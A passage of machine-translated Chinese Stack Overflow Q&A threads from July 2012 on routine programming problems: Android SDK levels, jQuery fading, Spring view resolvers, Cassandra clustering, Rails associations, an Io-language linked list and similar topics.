void wrapperFunction()
{
    instance->method();
}

callFunction(wrapperFunction); 
```

# android - 在较旧的 API AVD 上运行 android 应用程序

> ID：11603695
> 
> 赞同：0
> 
> 时间：2012-07-22T20:19:24.040
> 
> 标签：android, eclipse

我想使用 values-11、values-14 等来支持较新的主题。对于要编译的应用程序，我必须增加目标 API，但这会从运行配置中的选择列表中删除较低的 API AVD。你如何让 eclipse 在旧版本上运行它以查看它是否有效？我确定我可以手动加载它，但似乎 Eclipse 应该允许这样做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:23:28.413

您可以指定要定位的 API 级别，也可以指定运行应用程序的最低级别，在`<uses-sdk android:minSdkVersion="X" android:targetSdkVersion="Y" />`

关键是也要指定 minSdk 版本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:24:01.680

我认为 Eclipse 会尝试启动一个满足您的 AVD `targetApiLevel`，但如果任何 AVD 正在运行或高于您的`minSdkLevel`，那么它将使用它来代替。但是您需要确保 AVD 已在 Eclipse 中正确注册。根据我的经验，这通常意味着在 AVD 完全启动并显示主屏幕（或您的应用程序）之前不关闭 AVD 管理器窗口。

# javascript - 找到父DIV的ID并淡出DIV

> ID：11603697
> 
> 赞同：2
> 
> 时间：2012-07-22T20:19:55.837
> 
> 标签：javascript, jquery, html

单击 DIV 本身内的链接时，我试图淡出 DIV。这是我的代码：

```
$(".hideinfo").click(function () {
  var parentLink = $(this).parent().parent();               
  $(parentLink).fadeTo("slow", 0);
}); 
```

我没有直接指定 ID 的原因是因为我想用它来淡出具有不同 ID 的多个 DIV。

上面的代码在我设置警报时返回了 ID，但没有淡出 DIV 或我尝试的任何其他内容......这里的任何帮助将不胜感激。HTML 是：

```
<div id="First-Block" class="item">                 
    <p>text here</p>
    <p><a href="#" class="hideinfo">Back</a></p>    
</div> 
```

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T20:22:08.667

你应该`fadeOut("slow")`改用。

尝试将您的代码更改为：

```
$(".hideinfo").click(function () {
    var parentLink = $(this).parent().parent();
    $(parentLink).fadeOut("slow");
}); 
```

为了进一步改善这一点，您可以将代码缩短为：

```
$(".hideinfo").click(function() {
    $(this).closest(".item").fadeOut("slow");
}); 
```

顺便提一下，通过单击锚点，它将使用 . 跳转到页面顶部`#`。我会看看[.preventDefault()](http://api.jquery.com/event.preventDefault/)

你也可以在这里查看 API -> [http://api.jquery.com/fadeOut/](http://api.jquery.com/fadeOut/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:24:36.343

## *[jsBin 演示](http://jsbin.com/otoker/edit#javascript,html,live)*

```
$(".hideinfo").click(function( e ){
    e.preventDefault();           // prevent default anchor link behavior
    $(this).closest('.item').fadeTo(400, 0);
}); 
```

另外尝试将上述内容包装成`document ready`：

```
$(function(){
   // code here.
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T20:24:42.820

使用[fadeOut()](http://api.jquery.com/fadeOut/)代替，因为您的主要目标是影响整体可见性而不是给定的不透明度。

# node.js - connect.js 中间件的正确顺序？

> ID：11603701
> 
> 赞同：4
> 
> 时间：2012-07-22T20:20:28.040
> 
> 标签：node.js, express, connect

> 中间件相互依赖，例如 methodOverride() 检查 req.body.method 是否有 HTTP 方法覆盖，但是 bodyParser() 会解析请求正文并填充 req.body。另一个例子是cookie解析和会话支持，我们必须首先使用（）cookieParser（），然后是session（）_。

我想知道我们怎么知道应该先使用哪个中间件？我想知道某处是否已经存在有序列表（所有中间件的工作顺序正确的列表）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T03:57:59.893

connect[主页上](http://www.senchalabs.org/connect/)的中间件列表的顺序是正确的，尽管它没有明确指出依赖关系。

# windows - 引用 jre7

> ID：11603705
> 
> 赞同：1
> 
> 时间：2012-07-22T20:21:06.037
> 
> 标签：windows, java-7

我在我的 USB 存储器上运行 Eclipse。我需要使用 jre 7。我无法在我的公共计算机上安装 JRE 7。它只有 JRE 6。我如何引用 JRE 7？

最好的祝福

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T03:40:07.927

在您控制的机器上，从 Oracle（或您选择的供应商）下载最新的 JRE 并安装它。安装后，将`c:\Program Files\Java`文件夹复制到 U 盘。复制完文件后，您可以根据需要卸载 Java。

然后，您应该能够将 Eclipse 指向 USB 记忆棒上的 Java 实例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:26:06.663

在eclipse中，点击：

```
 window -> Preferences -> Java -> Installed JREs 
 click on Add
 select standard VM -> Next
 click on Directory... -> select the location of your jdk 7
 click on Finish -> ok 
```

# jsp - spring 3.0同时支持jsp和jspx

> ID：11603707
> 
> 赞同：3
> 
> 时间：2012-07-22T20:21:18.760
> 
> 标签：jsp, spring-mvc, spring-roo, spring-3, jspx

我已经设置了一个 roo 应用程序。roo 中内置的默认视图解析器用于 jspx 文件。是否也可以支持 jsp 文件？我尝试配置两个 viewResolver，但似乎没有 urlBasedViewResolvers 可以共存，它要么是一个，要么是另一个。

更改顺序不会影响行为。如果我将 order = 1 设置为 jspx，那么如果我搜索任何 .jsp 文件，它会给我 404。如果我搜索 jspx 但 jsp viewResolver 设置为 order = 1，则结果相同。

有没有办法做到这一点？谢谢！

这是我的 webmvc-config.xml

```
<bean id="viewResolver"
        class="org.springframework.web.servlet.view.UrlBasedViewResolver">
        <property name="order" value="1"/>
        <property name="viewClass"
            value="org.springframework.web.servlet.view.JstlView" />
        <property name="prefix" value="/WEB-INF/views/" />
        <property name="suffix" value=".jspx" />
    </bean>
    <bean id="jspViewResolver"
        class="org.springframework.web.servlet.view.InternalResourceViewResolver">
                <property name="order" value="2"/>
        <property name="viewClass"
            value="org.springframework.web.servlet.view.JstlView" />
        <property name="prefix" value="/WEB-INF/views/" />
        <property name="suffix" value=".jsp" />
    </bean> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-22T22:12:46.050

我能想到的一个可能不是好的解决方案是不提供后缀，并在返回视图名称时显式指定 .jsp 或 .jspx 后缀。

```
<bean id="jspViewResolver"
    class="org.springframework.web.servlet.view.InternalResourceViewResolver">
            <property name="order" value="2"/>
    <property name="viewClass"
        value="org.springframework.web.servlet.view.JstlView" />
    <property name="prefix" value="/WEB-INF/views/" />
    <property name="suffix" value="" />
</bean> 
```

并在返回视图名称时：

```
return "myview.jsp";
return "myview.jspx"; 
```

或者

如果您知道 jsp 和 jspx 视图名称的名称模式，另一种解决方案是将视图名称作为另一个参数提供给其中一个解析器：

```
<bean id="jspViewResolver"
    class="org.springframework.web.servlet.view.InternalResourceViewResolver">
            <property name="order" value="2"/>
    <property name="viewClass"
        value="org.springframework.web.servlet.view.JstlView" />
    <property name="prefix" value="/WEB-INF/views/" />
    <property name="suffix" value="jsp" />
    <property name="viewNames">
        <list>
    <value>view1*</view>
    <value>view2*</view>
    <value>view3*</view>
    </list>
    </property>
</bean> 
```

如果此 viewresolver 与任何视图模式都不匹配，则返回 null ，那么它将转到您的 jspx 视图解析器。

# javascript - e.preventDefault() 和 e.cancelBubble 不适用于附加的侦听器

> ID：11603709
> 
> 赞同：0
> 
> 时间：2012-07-22T20:21:31.313
> 
> 标签：javascript, javascript-events

我正在尝试禁用单击的链接。我有一个这样的 onmousedown 事件监听器。

```
if(document.addEventListener){
    document.addEventListener("onmouseover", onMouseOverIdent, false);
    document.addEventListener("onmousedown", onMouseDownIdent, false);
    document.addEventListener("onmouseout", onMouseOutIdent, false);
}else{
    if(document.attachEvent){
        document.attachEvent("onmousedown",onMouseDownIdent);
        document.attachEvent("onmouseover",onMouseOverIdent);
        document.attachEvent("onmouseout", onMouseOutIdent);
    }
} 
```

在我的 onmousedown 函数中，我尝试使用 quirksmode 中的这个函数：

```
if (!e) var e = window.event;
e.cancelBubble = true;
if (e.stopPropagation) e.stopPropagation(); 
```

但是，它仍然会单击链接并加载它。我不知道是什么原因造成的，我们将不胜感激。

更新：我忘记提及的另一件事是我正在页面上的所有锚标记元素上执行此操作。这似乎使之后删除这些听众变得更加困难。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T20:25:38.053

要使其不遵循 href，您应该使用`preventDefault`而不是`stopPropagation`.

对于 IE，你会使用

```
e.returnValue = false; 
```

所以它应该看起来像这样......

```
if (!e) var e = window.event;
e.returnValue = false;
if (e.preventDefault) e.preventDefault(); 
```

* * *

这假设处理程序直接在链接上，由于您已排除相关代码，因此现在无法知道。

* * *

还有一件事，你只是在处理这个`onmousedown`事件。如果您想阻止该行为或禁用实际`click`事件的冒泡，您应该这样做......

```
document.addEventListener("click", ...
document.attachEvent("onclick", ... 
```

另外，请注意`addEventListener`不应*将*其`"on"`作为事件名称的一部分。

# cassandra - cassandra 没有为 2 个服务器创建正确的环（每个服务器有 2 个实例）

> ID：11603719
> 
> 赞同：1
> 
> 时间：2012-07-22T20:23:13.597
> 
> 标签：cassandra

我正在使用 cassandra-1.1。

我想配置一个包含 4 个实例的集群（每台 pc 上有 2 个实例）我已将 .yaml 文件配置更新为以下内容：

```
listen_address = 127.0.0.1 (127.0.0.2)
rpc_port=9160 (9161)
rpc_address=0.0.0.0 
```

括号用于同一台电脑上的第二个实例。

但在这种情况下，nodetool 在同一台电脑上找到仅有的两个 cassandra 实例（而不是 4 个）

```
./nodetool -h 127.0.0.1 -p 8001 ring 
```

我也配置了

```
- seeds: "172.10.10.32,172.10.10.33" 
```

在两台电脑（xxx32 和 xxx33）上相同。

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T22:08:38.287

您的实例仅在环回接口（`127.0.0.1`和`127.0.0.2`）上侦听。远程节点将无法连接到您的本地环回接口。因此，他们将永远无法得知远程实例正在运行。

如果您希望远程节点能够连接，则需要侦听外部接口。

# r - 我可以在 R 中使用什么类型的绘图来获得以下效果？

> ID：11603727
> 
> 赞同：1
> 
> 时间：2012-07-22T20:24:37.590
> 
> 标签：r, graphics, plot

我以每月的粒度跟踪事件（我保证在一个月的同一天没有两个事件，每月大约 3-4 个事件，但有些空月，有些月达到 6 甚至 7 个）。这些事件被标记，我希望 y 轴代表每个事件独有的幅度，而它们沿 x 轴的位置按时间顺序排列。所以是这样的：

```
 E
  B
              C
A               D                    
---------------------------------------------->
Jun-07    Jul-07    Aug-07    Sept-07...... 
```

如果我用完整日期标记我的点，我如何在绘制它们时按月存储它们？我使用 ggplot2/qplot

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T22:44:46.237

这能得到你想要的吗：

```
# Fake data
events = c('A','C','C','B','B')
magnitudes = c(1,3,2,4,2)
times = c('7/4/12','7/5/12','7/7/12','7/10/12','7/15/12')

# Convert times to appropriate date format
library(lubridate)
times = mdy(times)

# Using "pch=events" gives you the appropriate plot symbols at the
#  appropriate places
plot(times, magnitudes, pch=events) 
```

# playframework-2.0 - 如何在 Play 中处理 MultiTimeZone 和本地时间/日期

> ID：11603731
> 
> 赞同：2
> 
> 时间：2012-07-22T20:25:06.990
> 
> 标签：playframework-2.0, jodatime

我对 MultiTimeZone 和/或本地日期没有太多经验，所以我对此有所了解，但我不知道如何以及从哪里开始，所以请温柔地对待我 :-)

我有两种类型的日期（时间）字段：

1.  日期（存储日、月和年）
2.  DateTime（与 1 相同，但包括时间）

我应该如何在 Play 中定义我的属性？

```
 @Formats.DateTime(pattern="MM-dd-yyyy")
 public Date reqCompletionDate; 
```

或者我应该使用 JodaTime（以前从未使用过）：

```
@Type(type="org.joda.time.contrib.hibernate.PersistentDateTime")
public DateTime reqCompletionDate; 
```

如果我去`java.util.Date`，如何将其转换为本地用户`Date format`（即 yyyy-MM-dd）？由于格式问题，播放自动绑定会失败，所以我需要为它创建一个自定义活页夹吗？这会影响我所有的`Date`领域，对吧？

或者您是否建议对所有日期（时间）字段使用 getter 和 setter，以便我可以传递用户`Locale`以获取正确的时间。在这种情况下， Play 的自动绑定将失败，我仍然需要自定义绑定器`Date`和`DateTime`？

或者我是否过度思考这一切，应该以不同的方式处理这个问题？谢谢你的想法！

```
UPDATE: 2012-07-23: I think I will follow these steps: 
```

**第 1 步**：开始播放并使用 UTC 时区进行初始化

**第 2 步**：根据 UTC 时区使所有日期时间字段格式相同

**第 3 步**：尽可能晚地转换为用户本地时间

当用户发布包含`local date (time)`尽快将其转换为 UTC 时间的表单时。如果我有时间，我会在这里发布我的代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T23:17:10.697

简而言之，使用 JodaTime。java.util.Date 应该被带到一个安静的领域，给最后一根烟，然后开枪。

更长的版本：

正确使用多语言环境可能很复杂，这不仅仅是在用户的时区中显示日期和时间的问题。

您需要考虑的一些事情的例子：

*   在澳大利亚时区渲染时，您的生日是否提前一天？
*   如果用户告诉支持人员它发生在星期二，但支持人员的星期二是 + 7 小时，他会在日志中找到它吗？
*   17 日的促销活动应该从哪个午夜开始？

java.util.Date 仅限于表示单个时间瞬间。这使得应对这些情况变得非常困难。您甚至无法通过检查它来判断它是代表日期还是日期时间。

Joda 为这些单独的概念提供了单独的类型，这使得使用它们变得更加简单。例如，LocalDate 没有时区或时间组件。您的生日是 LocalDate，因此它永远不会改变，DateTimes 表示为不同的类型。还有其他概念的类型，如间隔、持续时间，这使得时间/日期比较更容易。在极少数情况下，您必须支持不使用公历的语言环境，您可以轻松交换年表。

如果您使用的是 JPA，则 Joda 的适配器存在并且可以工作。如果您必须在其他地方使用它，Joda 也确实提供了与 java.util.Date 的互操作性。

# django - Django mptt和合并多个对象

> ID：11603732
> 
> 赞同：0
> 
> 时间：2012-07-22T20:25:08.957
> 
> 标签：django, traversal, django-mptt

我正在使用 django-mptt 并且我被卡住了。

我想获取每个类别的所有对象以及后代类别的所有对象。

我设法实现了我的目标，但有一个问题 - 我将无法对项目进行排序，因为它们是从多个对象生成的。

我想我的方法很糟糕。

我怎样才能实现我的目标，并可以组合所有返回的对象并按日期排序？

看法：

```
 def category_view(request, pk, slug, sub_pk=None, subcategory=None):

    if not subcategory:
        current_category = get_object_or_404(Category, pk=int(pk))
        adv_obj = current_category.get_descendants(include_self=True)
        print adv_obj

    else:
        current_category = get_object_or_404(Category, pk=int(sub_pk))
        adv_obj = current_category.get_descendants(include_self=True)

    return TemplateResponse(request, "category_view.html", {'category_details':current_category,
                                                            'advert': adv_obj,
                                                           },
                            ) 
```

模板：

```
{% block content %}
<div class="grid_8">
    <h2>{{category_details.name}}</h2>
    <hr>
    <div>
        {% for n in advert.all %}
        {% for p in n.advert_set.all %}

        <div>
            <h3>{{p.title}}</h3>
            <span class="annoucement_detail">Kategoria: </span><a href="{{n.category.get_absolute_url}}">{{p.category.name}}</a>
            {% if p.location %} | <span class="annoucement_detail">Miejscowość: </span>{{p.location}}
            {% endif %}
            <div>
                <span class="annoucement_detail">Data dodania: </span> {{p.date_added}} | <span class="annoucement_detail">Data wygaśnięcia: </span>{{p.expiration_date}}
            </div>
            <div>
                {{p.text}}
            </div>
        </div>
        <hr>
        {% endfor %}
        {% endfor %}
    </div>

</div>
{% endblock%} 
```

编辑：

我想出了一个主意。我将在视图中迭代结果并使用 itertools 将其链接起来。我明天会检查它是否可以工作:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T09:50:06.180

那是我的回答:)

```
def category_view(request, pk, slug, sub_pk=None, subcategory=None):

    advert_list = []

    if not subcategory:
        current_category = get_object_or_404(Category, pk=int(pk))
        adv_obj = current_category.get_descendants(include_self=True)

        for n in adv_obj:

            for p in n.advert_set.all().order_by('-date_added'):
                advert_list.append(p)

        adv_obj = chain(advert_list)

        adv_obj = sorted(adv_obj, key=operator.attrgetter('date_added'))
        adv_obj.reverse()

    else:
        current_category = get_object_or_404(Category, pk=int(sub_pk))
        adv_obj = current_category.get_descendants(include_self=True)

        for n in adv_obj:

            for p in n.advert_set.all().order_by('-date_added'):
                advert_list.append(p)

        adv_obj = chain(advert_list)
        adv_obj = sorted(adv_obj, key=operator.attrgetter('date_added'))
        adv_obj.reverse()

    return TemplateResponse(request, "category_view.html", {'category_details':current_category,
                                                            'advert': adv_obj,
                                                           },
                            ) 
```

# google-closure - 如何在大豆模板中加载依赖项？

> ID：11603735
> 
> 赞同：2
> 
> 时间：2012-07-22T20:25:21.413
> 
> 标签：google-closure, google-closure-templates

在我的 Google Closure 代码中，我创建了一个枚举来表示 CSS 类的名称，并希望在我的大豆模板中使用这个枚举：

```
/**
 * Lists a single widget.
 * @param widget The widget to be listed.
 */
{template .singleWidgetListing}
<div class='{app.ui.ClassNames.WIDGET_LISTING}'>
  <span class='{app.ui.ClassNames.WIDGET_LISTING_ITEM}'>{$widget.title}</span>
</div>
{/template} 
```

我尝试`goog.require('app.ui.ClassNames');`在大豆模板文件的顶部无济于事。执行此操作的标准方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:53:30.797

推荐的方法是避免在闭包模板中引用[全局变量：](https://developers.google.com/closure/templates/docs/javascript_usage#globals)

> **注意：**除非绝对必要，否则避免使用渲染时全局变量，因为它会导致模板和运行时环境之间的紧密耦合。

应改为使用模板参数：

```
{namespace myapp}

/**
 * Lists a single widget.
 * @param widget The widget to be listed.
 * @param classNames Map of CSS classes for styling widgets.
 */
{template .singleWidgetListing}
  <div class="{$classNames.WIDGET_LISTING}">
    <span class="{$classNames.WIDGET_LISTING_ITEM}">{$widget.title}</span>
  </div>
{/template} 
```

然后将从 JavaScript 调用模板，如下所示：

```
myapp.singleWidgetListing(
    {widget: myWidgetInstance, classNames: app.ui.ClassNames}); 
```

请参阅***[在 JavaScript 中使用闭包模板](https://developers.google.com/closure/templates/docs/javascript_usage)***。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-25T21:42:14.887

[还可以考虑将 CSS 类的映射作为注入数据 ( https://developers.google.com/closure/templates/docs/concepts#injecteddata](https://developers.google.com/closure/templates/docs/concepts#injecteddata) )传递到您的顶级模板中，这样您就不必通过它到需要它的子模板。

# python - 在 aws 上运行 python web 应用程序

> ID：11603736
> 
> 赞同：0
> 
> 时间：2012-07-22T20:25:22.367
> 
> 标签：python, apache

我将使用亚马逊网络服务和我创建的一些 python 脚本。我过去使用过 PHP，现在我想使用 python 编写一个 Web 应用程序，但没有 Django 之类的 Web 框架工作（我为此找到了很多教程）。

使用 PHP 时，只需将我的文件放在专用目录（例如 /var/www）中，然后服务器将处理它们。

使用 Python 脚本如何实现相同的目标？

Django python 脚本在做什么？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:30:42.833

它会根据您使用的框架略有不同，但通常您需要将 Web 服务器指向一个`wsgi`文件。要使用 Django 执行此操作，请参阅：[https](https://docs.djangoproject.com/en/dev/howto/deployment/wsgi/) ://docs.djangoproject.com/en/dev/howto/deployment/wsgi/和[http://lucumr.pocoo.org/2007/5/21/getting-started-with -wsgi/](http://lucumr.pocoo.org/2007/5/21/getting-started-with-wsgi/)用于 WSGI 的概述。

# javascript - Firefox 不会在 keydown 处理程序中设置 input.value ......但它在调试时工作？

> ID：11603742
> 
> 赞同：2
> 
> 时间：2012-07-22T20:25:53.550
> 
> 标签：javascript, firefox, dom

现在是深夜，我已经落后于最后期限，我正在努力解决一个对我来说似乎非常非常奇怪的问题。也许这很明显我错过了，因为我累了，但我不知道......无论如何这是我的测试用例：

```
<!doctype html>
<html>
<head>
  <script type="text/javascript">
    function NoEsc(e)
    {
      e = e||window.event;
      var k = e.keyCode||e.which;
      if (k!=27) return true;
      var s = e.target||e.srcElement;
      s.value = "ESCAPE PRESSED!";
      //alert("It works when this alert is shown!");
      return false;
    }
  </script>
</head>

<body onload="document.getElementById('in1').onkeydown=NoEsc;">
  <input type="text" id="in1" value="ORIGINAL VALUE">
</body>
</html> 
```

这个想法是，在我的页面上，按 ESC 不会重置整个表单，只会重置具有焦点的元素。对于上面的测试用例，我只是让 ESC 手动将输入元素中的文本设置为“ESCAPE PRESSED！”，然后取消 keydown 事件。

在 IE (v9) 中，这非常有效。然而，在 Firefox (v14.0.1) 中，当在输入中按下 ESC 时没有任何反应。 **但是**，如果我取消注释该行，或者如果我在声明`alert`之前在 FireBug 中设置断点，**那么**它可以完美运行。`s.value = "ESCAPE PRESSED!"`

 **我已经为此工作了一两个小时，此时我厌恶地举起双手并将问题发布在这里。我不知道为什么它不起作用。

有人可以帮我吗？我错过了什么明显的东西吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-28T13:22:21.810

我今天自己也遇到了这个问题（ff v16.0.2 @ winxp）。尤其是在 ESC 处将（脚本集值）重置为先前（用户输入的）值时令人讨厌。玩弄这个，我注意到TAB-ing 再回来会在脚本集字符串中烘烤。毫无疑问，以下似乎（到目前为止）是一个不错的解决方法：

```
s.value = "ESCAPE PRESSED!";
s.blur();    // tab out
s.focus();   // tab right back in
return false; 
```

很奇怪。（这绝对似乎是一个错误。）

干杯!**

# apache-flex - Flex 可为空的 Combobox/Dropdownlist - 如何自定义它

> ID：11603746
> 
> 赞同：0
> 
> 时间：2012-07-22T20:26:05.870
> 
> 标签：apache-flex, combobox, nullable, custom-component

好的，我想要的是非常典型的，我相信很多 Flex 开发人员在他们生命中的某个时刻也想要它。举个例子：

在用户个人资料页面中，有一个“当前雇主”的组合框/下拉列表，其中应该有一个名为“无雇主”的项目以及其他真正的雇主，如“IBM”、“Apple”……我们都可以想象 IBM , Apple 来自数据库/服务器端，“没有雇主”不是，只是空雇员的标签。因此，如果选择“无雇主”，组合框/下拉列表将返回 null 作为所选项目。

自去年以来，我在 Google 上搜索了很多次。100% 的人建议将虚拟项目放入 dataProvider。我做到了，这还不错。但我正在考虑一个我更喜欢的替代方案：在组合框/下拉列表中放置一个按钮（具有标签 =“无雇主”），当用户点击该按钮时，selectedIndex = -1（即 selectedItem = null 太）。

但是我缺乏实现这样一个自定义组件的经验和技能。请给我一些提示或一些在线资源来做到这一点。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:40:59.187

如果您使用的是 Flex 4.5 或更高版本，您可以使用下拉列表的“提示”属性。当未选择任何项目时，组件将显示提示。因此，在您的情况下，当用户单击“无雇主”按钮时，通过设置 selectedIndex=-1，下拉列表应更改提示属性中指定的文本。

# ruby-on-rails - Rails - has_one belongs_to - 在视图中显示值

> ID：11603747
> 
> 赞同：1
> 
> 时间：2012-07-22T20:26:09.540
> 
> 标签：ruby-on-rails, activerecord

我希望我忽略了一些愚蠢的事情，并提前感谢您的帮助，我对 Rails 很陌生，刚刚完成了 Michael Hartl 的 Rails Tutorial Book，我正在努力做没有脚手架的事情。

每个费用都有一个 ExpenseType ...（1 = 膳食，2 = 机票等）。我将整数作为 type_id 存储在费用表中。在我看来，我想显示实际 ExpenseType 名称字段的值。

错误是（我清楚地看到它为什么会失败，费用表中没有费用 ID 列......但我不确定我缺少什么连接。

```
SQLite3::SQLException: no such column: expense_types.expense_id: SELECT  "expense_types".* FROM "expense_types"  WHERE "expense_types"."expense_id" = 14 LIMIT 1 
```

我认为我需要提供更明确的外键引用，但我尝试将其包含在行中并没有帮助。

* * *

楷模

```
class Expense < ActiveRecord::Base
  attr_accessible :amount, :expense_date, :description, :is_billable, :mileage, 
                                :pay_method, :project_id, :type_id

  belongs_to :project
  has_one :expense_type

  validates :expense_date, presence: true
  validates :type_id, presence: true
  validates :project_id, presence: true  
  validates :amount, presence: true, numericality: { greater_than: 0 }

end 
```

和 ExpenseType 模型

```
class ExpenseType < ActiveRecord::Base
  attr_accessible :name, :active

  belongs_to :expense

  validates :name, presence: true

end 
```

我的控制器

```
class ExpensesController < ApplicationController

def index
  @expense = Expense.new
  @expense_list = Expense.all

  # UI options
  @button_text = 'New' 
  @button_type = 'primary'   

end

def new
end

def create
  @expense = Expense.new(params[:expense])
  @expense_list = Expense.all

  # UI options
  @button_text = 'New' 
  @button_type = 'primary'   

  if @expense.save
    #sign_in @expense
    flash[:success] = "You have added an expense."
      redirect_to :back
  else
      render 'index'
  end

end

def edit
  @expense = Expense.find(params[:id])
  @expense_list = Expense.all

  # UI options
  @button_text = 'Save' 
  @button_type = 'success'   

  render 'index'
end

def update
  @expense = Expense.find(params[:id])
  @expense_list = Expense.all  
  if @expense.update_attributes(params[:expense])
    flash[:success] = "Updated"
    #sign_in @expense
    redirect_to :back
  else
    render 'index'
  end
end

def destroy
  @expense = Expense.find(params[:id])
  @expense.destroy
  flash[:success] = "expense deleted"
  redirect_to :back
end

end 
```

最后是视图

```
<% provide(:title, 'Expenses') %>
<h1>Manage Expenses</h1>

<div class="row">
  <div class="span11 well"> 
    <%= form_for @expense do |f| %>
    <%= render 'shared/error_messages', object: f.object %>    

    <div class="row">   

          <div class="span4">
            <%= f.label :project_id %>
            <%= f.text_field :project_id, class: "span4" %>
          </div>  

    </div>
    <div class="row">   

          <div class="span2">
            <%= f.label :expense_date, "Date" %>
            <%= f.text_field :expense_date, class: "span2", value: "03/04/2012" %>
          </div>

          <div class="span3">
            <%= f.label :type_id %>
            <%= collection_select(:expense, :type_id, ExpenseType.all, 
                    :id, :name, { prompt: 'Select Expense Type'}, { class: 'span3' }) %>
          </div>  

          <div class="span1">
            <%= f.label :amount %>
            <%= f.text_field :amount, class: "span1" %>
          </div>          

          <div class="span1">
            <%= f.label :mileage %>
            <%= f.text_field :mileage, class: "span1" %>
          </div>  
          <div class="span1">
            <%= f.label :is_billable, "Billable?" %>
            <%= f.text_field :is_billable, class: "span1" %>
          </div>                        
           <div class="span2">
            <%= f.label :pay_method %>
            <%= f.text_field :pay_method, class: "span2" %>
          </div>          

    </div>
    <div class="row">   
          <div class="span4">
            <%= f.label :description %>
            <%= f.text_area :description, rows: 2, class: "span4" %>
          </div>

          <div class="span3">
            <%= f.label :description, "Attendees" %>
            <%= f.text_area :description, rows: 2, class: "span3" %>
          </div>
         <div class="span2">
           <BR> <%= f.submit "    #{@button_text}    ", class: "btn btn-large btn-#{@button_type}" %>
          </div>

    </div>    
    <% end %>
  </div>
</div>

<div class="row">
  <div class="span12">
     <table class="table table-bordered table-striped">
       <thead>
        <tr>
          <th>Date</th>
          <th>Project</th>
          <th>Type</th>
          <th>Amount</th>         
          <th>Description</th>  
        </tr> 
       </thead>
       <tbody>
       <% @expense_list.each do |expense_item| %>

       <tr>
          <td><%= expense_item.expense_date %></td>
          <td><%= expense_item.project_id %></td>         
          <td><%= expense_item.type_id %></td>         
          <td><%= expense_item.amount %></td>
          <td><%= expense_item.description %></td>

          <td><%= link_to 'Edit', edit_expense_path(expense_item[:id]) %></td>
          <td><%= link_to 'Delete', expense_item, method: :delete, data: { confirm: 'Are you sure?' } %></td>
        </tr>
        <% end %> 
      </tbody>  
    </table>

  </div>
</div> 
```

...我正在处理的部分是后一部分，为了清楚起见再次粘贴在这里

```
<% @expense_list.each do |expense_item| %>

          .....

<%= expense_item.expense_type.name %>

          ......
        <% end %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:53:46.257

您将在模型关联中指定 FK。此外，您似乎应该在这里使用 belongs_to 关系，而不是 has_one

has_one 意味着对费用对象的更改意味着费用类型记录也应该更改（不是必须更改，而是按照惯例）。

如果你使用 has_one 你需要做：

```
has_one :expense_type, primary_key: :type_id 
```

与belongs_to：

```
belongs_to :expense_type, foreign_key: :type_id 
```

根据我认为您的代码应该在 ExpenseType 中构建的方式，您应该具有：

```
has_many :expenses, foreign_key: :type_id 
```

# iolanguage - 实现了一个链表。需要帮助创建堆栈和队列

> ID：11603748
> 
> 赞同：1
> 
> 时间：2012-07-22T20:26:17.333
> 
> 标签：iolanguage

我在这里已经有了一个工作链表：

```
Single_Linked_List := Object clone do(
    head ::= nil;

  // constructor
  init := method(
    head = nil
  );

  // methods
  isEmpty := method(
    self head == nil
  );

  empty := method(
    self head = nil
    );

  insert_at_tail := method(n,
    if(self head == nil,
      self setHead(Linked_List_Node clone)
    );
    self head insert_at_tail(n);

  );

  insert_at_head := method(n,
    newnode := Linked_List_Node clone;
    if(self head == nil, 
        self setHead(newnode),
        newnode link = self head;
        self setHead(newnode)
    );      
    self head insert_at_head(n);
  );

  remove_at_head := method(
    if(self head == nil, return nil);
    if(self head link == nil, self head value println; self setHead(nil), self setHead(self head link));

    );

  )
)

Linked_List_Node := Object clone do(
  value ::= nil;
  link ::= nil;

  // constructor
  init := method(
    value = nil;
    link = nil
  );

  // methods
  insert_at_tail := method(n,
    if(self value == nil,
      self setValue(n),
      if (self link == nil,
        self setLink(Linked_List_Node clone)
      );
      self link insert_at_tail(n)
    );

  );

  insert_at_head := method(n,
    self setValue(n));

  push := method(n,
    self setValue(n);

    );

  enqueue := method(n,
    self setValue(n));
)

Stack_2 := Object Single_Linked_List clone do(
    head ::= nil;

  // constructor
  init := method(
    head = nil
  );

  // methods
  isEmpty := method(
    self head == nil
  );

  push := method(n,
      newhead := Linked_List_Node clone;
      if(self head == nil, newhead link = nil, newhead link = self head
    );
      self setHead(newhead);      
      self head push(n);

  );

  pop := method(
    if(self head == nil, return nil);
    if(self head link == nil, self head value println, self head value println; setHead(self head link)   
    );

  )
)

Queue_2 := Single_Linked_List clone do(
    head ::= nil;
    tail ::= nil;

  // constructor
  init := method(
    head = nil;
    tail = nil
  );

  // methods

  enqueue := method(n,
      newnode := Linked_List_Node clone;
      if(self tail == nil, self setHead(newnode); self setTail(newnode); newnode link = nil, self tail link = newnode; self setTail(newnode)

    );        
      self tail enqueue(n);

  );

  dequeue := method(
    if(self head == nil, return nil, self head value println; setHead(self head link)); 

  )
) 
```

现在我需要实现一个堆栈和一个队列。这是我第一次尝试使用这种语言，我很难理解我现在需要为堆栈和队列做什么。

* * *

## 回答 #1

> 赞同：0
> 
